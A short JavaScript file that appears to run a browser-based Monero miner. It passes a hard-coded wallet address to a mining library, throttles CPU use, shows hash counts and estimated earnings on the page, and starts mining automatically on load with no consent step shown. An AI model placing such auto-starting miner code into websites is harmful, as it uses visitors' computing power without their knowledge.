 var timeout;
 var XMR;

 function addText(e) {

     var t = document.getElementById("texta");
     "job" === e.identifier ? t.value += "new job: " + e.job_id : "solved" === e.identifier ? t.value +=
         "solved job: " + e.job_id : "hashsolved" === e.identifier ? t.value += "pool accepted hash!" : "error" ===
         e.identifier ? t.value += "error: " + e.param : t.value += e, t.value += "\n", t.scrollTop = t.scrollHeight
 }

 function miner() {
     OMINE(
             "46x3JVoby2KYGv4c18oBNb3fgcaXowwi9BSpq9MDmzYfX7dJie4Nx58Ckcc9tRV8tFHbk9kkFBvdZQfhdYo69vY3MPnnWKF#JOHN_PC",
             "-1"),
         throttleMiner = 70,
         addText("Connecting..."),
         timeout = setInterval(function () {
             for (; sendStack.length > 0;) addText(sendStack.pop());
             for (; receiveStack.length > 0;) addText(receiveStack.pop());
             addText("calculated " + totalhashes + " hashes.")
             document.getElementById("totalHashes").innerHTML = totalhashes;
             document.getElementById("XMR").innerHTML = (totalhashes *
                 0.00000000005929);
         }, 2e3);

 }

 miner();